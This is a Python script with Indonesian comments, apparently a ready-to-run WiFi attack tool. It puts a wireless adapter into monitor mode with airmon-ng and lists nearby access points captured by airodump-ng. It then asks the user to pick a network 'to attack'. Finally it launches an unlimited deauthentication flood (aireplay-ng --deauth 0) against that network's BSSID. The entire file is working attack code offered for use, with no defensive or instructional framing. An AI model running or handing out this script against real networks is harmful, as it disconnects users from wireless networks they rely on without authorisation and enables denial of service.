#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# List untuk menyimpan jaringan nirkabel yang aktif
active_wireless_networks = []

# Fungsi untuk memeriksa apakah ESSID sudah ada di dalam list
def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Header dan keterangan hak cipta
print(r"""
 
 █████  ██████  ███████ ███    ██  █████  ██      ██████  ██    ██ ██████  
██   ██ ██   ██ ██      ████   ██ ██   ██ ██      ██   ██  ██  ██  ██   ██ 
███████ ██████  █████   ██ ██  ██ ███████ ██      ██   ██   ████   ██████  
██   ██ ██   ██ ██      ██  ██ ██ ██   ██ ██      ██   ██    ██    ██      
██   ██ ██   ██ ███████ ██   ████ ██   ██ ███████ ██████     ██    ██      
                                                                           
                                                                           
""")
print("\n****************************************************************")
print("\n* Hak Cipta ArenaldyP, 2024                                *")
print("\n****************************************************************")

# Periksa apakah program dijalankan dengan hak super user (sudo)
if not 'SUDO_UID' in os.environ.keys():
    print("Coba jalankan program ini dengan sudo.")
    exit()

# Pindahkan file .csv yang ada ke direktori cadangan jika ada
for file_name in os.listdir():
    if ".csv" in file_name:
        print("Tidak boleh ada file .csv di direktori Anda. Kami menemukan file .csv di direktori Anda dan akan memindahkannya ke direktori cadangan.")

        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Folder cadangan sudah ada.")

        timestamp = datetime.now()

        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex untuk mencari antarmuka wlan yang tersedia
wlan_pattern = re.compile("^wlan[0-9]+")

# Ambil daftar antarmuka WiFi yang tersedia menggunakan iwconfig
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# Jika tidak ada antarmuka WiFi yang terhubung, keluar dari program
if len(check_wifi_result) == 0:
    print("Hubungkan adapter WiFi dan coba lagi.")
    exit()

# Tampilkan daftar antarmuka WiFi yang tersedia dan minta pengguna untuk memilih
print("Berikut ini antarmuka WiFi yang tersedia:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Pilih antarmuka yang ingin Anda gunakan untuk serangan: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Silakan masukkan nomor yang sesuai dengan pilihan yang tersedia.")

# Simpan pilihan antarmuka WiFi yang dipilih dalam variabel hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Konfirmasi koneksi WiFi dan hentikan proses yang bertentangan menggunakan airmon-ng
print("Adapter WiFi terhubung!\nSekarang mari kita hentikan proses yang bertentangan:")
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Pasang antarmuka WiFi dalam mode monitor menggunakan airmon-ng
print("Memasukkan adapter Wifi ke mode dipantau:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Mulai memindai dan menangkap titik akses menggunakan airodump-ng
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        # Bersihkan layar sebelum menampilkan daftar titik akses WiFi yang ditemukan
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Pemindaian. Tekan Ctrl+C saat Anda ingin memilih jaringan nirkabel yang ingin Anda serang.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")

        time.sleep(1)

except KeyboardInterrupt:
    print("\nSiap untuk membuat pilihan.")

# Meminta pengguna untuk memilih jaringan nirkabel yang akan diserang
while True:
    choice = input("Silakan pilih pilihan dari yang tersedia di atas: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Silakan coba lagi.")

# Simpan informasi BSSID dan channel dari jaringan yang dipilih
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Pindah ke channel yang sama dengan jaringan yang dipilih untuk melakukan serangan
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Lakukan serangan deauthenticate menggunakan aireplay-ng
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
